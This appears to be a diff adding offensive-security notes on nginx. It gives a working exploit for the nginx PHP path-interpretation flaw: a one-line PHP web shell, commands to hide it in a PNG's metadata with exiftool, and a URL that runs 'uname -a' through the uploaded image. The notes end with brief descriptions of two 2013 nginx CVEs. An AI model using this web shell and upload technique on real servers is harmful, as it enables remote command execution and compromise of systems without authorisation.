@@ -1,0 +1,18 @@
+# nginx
+
+# 2010, discovered by 80sec.com
+http://blah/uploads/hacker.png/x.php
+if not configured properly, will be interpreted as PHP code
+
+echo "<?php system($_GET['c']); ?>" > shell.php
+$ exiftool "-comment<=shell.php" malicious.png # use strings to make sure all's good (http://www.sno.phy.queensu.ca/~phil/exiftool/index.html)
+http://blah/uploads/136991823.png/c.php?c=uname%20-a
+
+# vulns
+* Request line parsing vulnerability (CVE-2013-4547)
+http://mailman.nginx.org/pipermail/nginx-announce/2013/000125.html
+nginx 0.8.41 through 1.4.3 and 1.5.x before 1.5.7 allows remote attackers to bypass intended restrictions via an unescaped space character in a URI.
+
+* (CVE-2013-2070)
+http://mailman.nginx.org/pipermail/nginx-announce/2013/000114.html
+A memory disclosure vulnerability is present in nginx versions 1.1.4 to 1.2.8 and 1.3.0 to 1.4.0. The vulnerability is present if proxy_pass to untrusted upstream HTTP servers is used.  The vulnerability could also lead to a denial of service.
